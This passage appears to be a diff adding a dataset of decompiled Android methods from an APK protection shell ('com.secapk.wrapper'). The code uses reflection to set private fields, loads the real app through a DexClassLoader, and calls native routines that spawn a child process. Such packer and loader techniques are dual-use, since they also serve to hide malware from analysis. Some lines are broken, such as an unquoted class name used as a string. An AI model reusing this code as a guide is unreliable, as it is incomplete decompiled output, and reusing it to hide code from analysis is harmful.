+            }
+        }
+        return null;
+    }
+
+    public static Object getFieldValue(Class<?> cls, Object obj, String name) {
+        try {
+            Field f = getField(cls, name);
+            return f.get(obj);
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            return null;
+        }
+    }
+
+    public static void setFieldValue(Class<?> cls, Object obj, String name, Object value) {
+        System.out.println("setFieldValue" + cls + obj + name + value);
+        if (name != null) {
+            try {
+                Field f = getField(cls, name);
+                f.setAccessible(true);
+                f.set(obj, value);
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
+        }
+    }
+}
+
+Package Path:com.secapk.wrapper.FirstApplication.onCreate
+Class Name:FirstApplication
+Content: package com.secapk.wrapper;
+
+    public void onCreate() {
+        super.onCreate();
+    }
+
+Package Path:com.secapk.wrapper.FirstApplication.FirstApplication
+Class Name:FirstApplication
+Content: package com.secapk.wrapper;
+
+public class FirstApplication extends Application {
+    @Override // android.app.Application
+    public void onCreate() {
+        super.onCreate();
+    }
+}
+
+Package Path:com.secapk.wrapper.Util.checkX86
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    private static void checkX86(Context ctx) {
+        String cpuinfo = Build.CPU_ABI;
+        if (cpuinfo.equals("x86")) {
+            isX86 = true;
+        }
+        if (isX86) {
+            String libfileName = "/data/data/" + ctx.getPackageName() + "/.cache/" + ctx.getPackageName();
+            File libFile = new File(libfileName);
+            if (!libFile.exists()) {
+                CopyLib(ctx);
+            }
+        }
+    }
+
+Package Path:com.secapk.wrapper.Util.tryDo
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    private static void tryDo(Context ctx) {
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        ACall.getACall().r2(ctx.getPackageName().getBytes(), apkFilePath.getBytes(), ctx.getApplicationInfo().processName.getBytes());
+    }
+
+Package Path:com.secapk.wrapper.ApplicationWrapper.onCreate
+Class Name:ApplicationWrapper
+Content: package com.secapk.wrapper;
+
+    public void onCreate() {
+        super.onCreate();
+        if (Util.getCustomClassLoader() == null) {
+            Util.runAll(this);
+        }
+        String applicationClass = FirstApplication;
+        try {
+            this.cl = (DexClassLoader) Util.getCustomClassLoader();
+            Class<?> c = getClassLoader().loadClass(applicationClass);
+            realApplication = (Application) c.newInstance();
+        } catch (Exception e) {
+            e.printStackTrace();
+            realApplication = null;
+        }
+        if (realApplication != null) {
+            ACall p = ACall.getACall();
+            p.at1(realApplication, getBaseContext());
+            p.set2(this, realApplication, this.cl, getBaseContext());
+            try {
+                if (Float.parseFloat(Build.VERSION.RELEASE.substring(0, 3)) <= 2.1f) {
+                    p.set3(realApplication);
+                }
+            } catch (Exception e2) {
+            }
+            Util.doProvider();
+            realApplication.onCreate();
+        }
+    }
+
+Package Path:com.secapk.wrapper.ACall.s1
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void s1(Object obj, Object obj2, Object obj3);
+
+Package Path:com.secapk.wrapper.ApplicationWrapper.onLowMemory
+Class Name:ApplicationWrapper
+Content: package com.secapk.wrapper;
+
+    public void onLowMemory() {
+        super.onLowMemory();
+        if (realApplication != null) {
+            realApplication.onLowMemory();
+        }
+    }
+
+Package Path:com.secapk.wrapper.Util.createChildProcess
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    private static void createChildProcess(Context ctx) {
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        ACall.getACall().r1(ctx.getPackageName().getBytes(), apkFilePath.getBytes());
+    }
+
+Package Path:com.secapk.wrapper.ApplicationWrapper.onConfigurationChanged
+Class Name:ApplicationWrapper
+Content: package com.secapk.wrapper;
+
+    public void onConfigurationChanged(Configuration newConfig) {
+        super.onConfigurationChanged(newConfig);
+        if (realApplication != null) {
+            realApplication.onConfigurationChanged(newConfig);
+        }
+    }
+
+Package Path:com.secapk.wrapper.Util.addProvider
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static void addProvider(ContentProvider p) {
+        synchronized (ps) {
+            x86Ctx = p.getContext();
+            ACall.getACall().set5(p);
+        }
+    }
+
+Package Path:com.secapk.wrapper.ACall.getACall
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public static ACall getACall() {
+        if (acall == null) {
+            acall = new ACall();
+        }
+        return acall;
     }
